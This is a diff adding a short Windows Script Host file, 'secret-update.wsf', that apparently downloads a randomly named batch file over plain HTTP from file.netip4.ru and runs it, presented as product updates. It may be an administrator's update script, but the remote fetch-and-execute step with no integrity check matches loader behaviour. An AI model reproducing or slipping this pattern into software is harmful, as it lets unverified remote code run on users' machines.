@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="Windows-1251"?>
+<!-- ***************************** -->
+<!-- File wsf -->
+<!-- secret-update.wsf -->
+<!-- g4tvl1bqqadzbqpevfo8.wsf -->
+<!--
+	This Script Downloads NIT Product Updates and Run it
+-->
+<!-- ***************************** -->
+<job id="ID1">
+	<script language="JScript" src="C:\pub1\Distrib\LIB\LIB-JS\lib_func-1.0.0.js"></script>
+	<script language="JScript" src="C:\pub1\Distrib\LIB\LIB-JS\lib_func-1.1.0.js"></script>
+	<script language="JScript" src="C:\pub1\Distrib\LIB\LIB-JS\lib_install-1.0.0.js"></script>
+	<script language="JScript" src="C:\pub1\Distrib\LIB\LIB-JS\lib_check-1.0.0.js"></script>
+	<script language="JScript">
+	<![CDATA[
+	// Declare Global Variables
+	var strURL, strCmd, iTimeOut
+	var http_pref, http_host, http_port, http_dir
+	// Define Host Variables
+	http_pref = "http"
+	http_host = "file.netip4.ru"
+	http_port = "80"
+	http_dir = "/WinUpdate/Secret-Update/"
+	// Define Installation Command File
+	strCmd = "g4tvl1bqqadzbqpevfo8.bat"
+	// Define Timeout for Script Execution (in ms)
+	iTimeOut = 60000 // 1 min Max 12 min
+	// Define Derivatives Variables
+	strURL = http_pref + "://" + http_host + ":" + http_port + http_dir
+	]]>
+	</script>
+	<script language="VBScript">
+	<![CDATA[
+	' Declare Temporary Variables
+	Dim iFlag
+	' Run Function
+	iflag = CmdDownlRun01(strURL, strCMD, iTimeOut)
+	' The End
+	]]>
+	</script>
+</job>
